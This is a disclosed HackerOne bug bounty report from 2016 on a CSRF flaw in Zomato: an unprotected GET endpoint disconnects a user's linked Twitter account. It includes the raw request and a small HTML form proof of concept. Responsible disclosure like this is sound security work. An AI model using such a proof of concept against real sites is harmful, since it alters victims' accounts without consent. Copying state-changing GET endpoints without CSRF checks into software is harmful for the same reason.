# Twitter Disconnect CSRF

## Report Details
- **Report ID**: 114127
- **URL**: https://hackerone.com/reports/114127
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-02-02T14:11:44.905Z
- **Disclosed**: 2016-09-30T11:18:01.605Z

## Reporter
- **Username**: hussain_0x3c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
**Hi**

Using this CSRF vulnerability one could disconnect  Twitter account from their profiles.

**Vulnerable request**
~~~
GET /php/disconnect_twitter_profile.php HTTP/1.1
Host: www.zomato.com
Connection: keep-alive
Accept: text/html, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
Referer: https://www.zomato.com/
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
X-dotNet-Beautifier: 668; DO-NOT-REMOVE
~~~
**POC Code**
~~~
<html>
<body>
<form action="https://www.zomato.com/php/disconnect_twitter_profile.php">
 <input type="submit" value="disconnect" />
</form>
</body>
</html>
~~~

**Steps to reproduce**

* Add  Account Twitter  
* Connect to your twitter account
* Use the above poc code to disconnect the twitter account

**Regards**
**Husssain**


## Attachments
No attachments
